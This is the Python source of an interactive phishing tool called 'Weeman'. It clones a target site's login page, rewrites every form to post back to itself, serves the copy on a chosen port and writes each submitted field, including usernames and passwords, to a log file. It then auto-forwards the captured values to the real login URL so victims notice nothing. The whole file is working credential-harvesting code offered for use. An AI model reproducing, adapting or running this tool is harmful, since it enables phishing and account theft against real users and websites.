from os import system
from bs4 import BeautifulSoup as bs
import urllib.request as ulib
import http.server
import socketserver
import os
import cgi


# default settings #
port=int(8080)
url="http://localhost"
action_url="http://localhost/login"
user_agent="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36"

############################################################################################################################################

class handler(http.server.SimpleHTTPRequestHandler):
	def do_POST(self):
		post_request = []
		print("\t"+self.address_string(),"sent POST req")
		form = cgi.FieldStorage(self.rfile,headers=self.headers,
		    environ={'REQUEST_METHOD':'POST',
			     'CONTENT_TYPE':self.headers['Content-Type'],})

		log=open(url.split("//")[1]+".log","a+")
		log.write("**************************************************************")
		log.write("Data for "+url+"\n")

		for tag in form.list:
			tmp = str(tag).split("(")[1]
			key,value = tmp.replace(")", "").replace("\'", "").replace(",", "").split()
			post_request.append((key,value))
			print("\t"+key+" = "+value)
			log.write(key+"="+value+"\n")
		
		log.close();
		create_post(url,action_url,post_request)
		http.server.SimpleHTTPRequestHandler.do_GET(self)
		
############################################################################################################################################

class myweeman:
	def __init__(self,url,port):
		self.port=port
		self.url=url
		self.httpd=None
		self.form_url=None

	def clone(self):
		print("\tTrying to get",url+"...")
		data = ulib.urlopen(self.url).read()

		print("\tExtracting HTML file...")
		data = bs(data,"html.parser")

		for tag in data.find_all("form"):
			tag["action"]="ref.html"
			tag["method"]="post"
		print("\tModifying HTML file...")
		with open("index.html", "w") as index:
	    		index.write(data.prettify())
	    		index.close()

	def serve(self):
		print("\tStarting Weeman server on 0.0.0.0:"+str(self.port)+"\n")
		self.httpd = socketserver.TCPServer(("",self.port),handler)
		self.httpd.serve_forever()

	def cleanup(self):
		print("\nPerforming cleanup...")
		if os.path.exists("index.html"):
			os.remove("index.html")
		if os.path.exists("ref.html"):
			os.remove("ref.html")

############################################################################################################################################

def create_post(url,action_url,post_request):
	print("\n\tCreating ref.html...")

	ref = open("ref.html","w")
	ref.write("<body><form id=\"ff\" action=\""+action_url+"\" method=\"post\" >\n")
	
	for post in post_request:
		key,value = post
		ref.write("<input name=\""+key+"\" value=\""+value+"\" type=\"hidden\" >\n" )
	
	ref.write("<input name=\"login\" type=\"hidden\">")
	ref.write("<script langauge=\"javascript\">document.forms[\"ff\"].submit();</script>")
	ref.close()

############################################################################################################################################

def help():
	print("\t"+"-"*30)
	print("\tshow   : show default settings")
	print("\tset    : config settings (set port 80)")
	print("\trun    : start the server")
	print("\tclear  : clear screen")
	print("\thelp   : show help")
	print("\tquit   : to exit")
	print("\t"+"-"*30)

def show():
	print("\t"+"-"*30)
	print("\tport        :",port)
	print("\turl         :",url)
	print("\taction_url  :",action_url)
	print("\tuser_agent  :",user_agent)
	print("\t"+"-"*30)


def main():
	print("****************** Welcome to Weeman !! *********************")
	print()
	print()
	while True:
		try:
			comm=input("weeman>> ").split()
		
			if not comm:
				print(end='')
		
			elif comm[0]=="show":
				show()

			elif comm[0]=="set":
				if(comm[1]=="port"):
					global port
					port=int(comm[2])
					print("Port=",port)

				if(comm[1]=="url"):
					global url
					url=comm[2]
					print("URL=",url)

				if(comm[1]=="action_url"):
					global action_url
					action_url=comm[2]
					print("Action URL=",action_url)

				if(comm[1]=="user_agent"):
					global user_agent
					if(len(comm)==3):
						user_agent=comm[2]
					else:
						user_agent=""
					print("User-agent=",user_agent)
		
			elif comm[0]=="run":
				w=myweeman( url, port)
				w.clone()
				w.serve()

			elif comm[0]=="clear":
				system("clear")

			elif comm[0]=="help":
				help()

			elif comm[0]=="quit":
				exit()

			else:
				print("ERROR!! Check 'help' command")

		except KeyboardInterrupt:
			w=myweeman( url, port)
			w.cleanup()
			print("\nInterrupt......")

		except Exception as e:
			print("ERROR: ",e)

############################################################################################################################################		
	
if __name__=="__main__":
	main()
